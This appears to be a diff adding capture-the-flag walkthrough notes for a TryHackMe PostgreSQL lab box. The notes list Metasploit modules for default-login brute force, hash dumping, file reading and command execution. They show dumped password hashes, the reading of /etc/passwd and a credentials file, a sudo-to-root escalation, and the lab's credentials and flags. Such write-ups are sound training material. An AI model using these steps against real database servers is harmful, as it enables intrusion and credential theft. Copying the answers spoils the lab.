@@ -1,0 +1,61 @@
+IP : 10.10.88.212
+
+Open Ports : 22,80,5432
+
+Database : postgresql
+
+Databse port : 5432
+
+Metasploit default user enum: auxiliary/scanner/postgres/postgres_login
+
+User found : postgres:password
+
+Metasploit module to execute generic queries : auxiliary/admin/postgres/postgres_sql
+
+RDBMS Version installed : 9.5.21
+
+Metasploit module to dump user hashes : auxiliary/scanner/postgres/postgres_hashdump
+
+No. of hashed dumped : 6
+
+	[+] Postgres Server Hashes
+======================
+
+ Username   Hash
+ --------   ----
+ darkstart  md58842b99375db43e9fdf238753623a27d
+ poster     md578fb805c7412ae597b399844a54cce0a
+ postgres   md532e12f215ba27cb750c9e093ce4b5127
+ sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
+ ti         md57af9ac4c593e9e4f275576e13f935579
+ tryhackme  md503aab1165001c8f8ccae31a8824efddc
+
+
+Metasploit module to view files : auxiliary/admin/postgres/postgres_readfile
+
+Dumping /etc/password : users found : dark
+
+We also found potential path for stored credentials: /home/dark/credentials.txt
+
+Lets get that:
+
+	dark:qwerty1234#!hackme
+
+Metasploit module for command execution : exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+
+
+
+Lets SSH :
+	Check /var/www/html directory to get alison's credentials : alison:p4ssw0rdS3cur3!#
+
+Change user with su and get the flag in /home/alison/user.txt : THM{postgresql_fa1l_conf1gurat1on}
+
+
+Privesc : running sudo -l we found that alison can run all commands as root.
+
+Lets run sudo su.
+
+We are root : Get the root flag : THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
+
+!!!
+
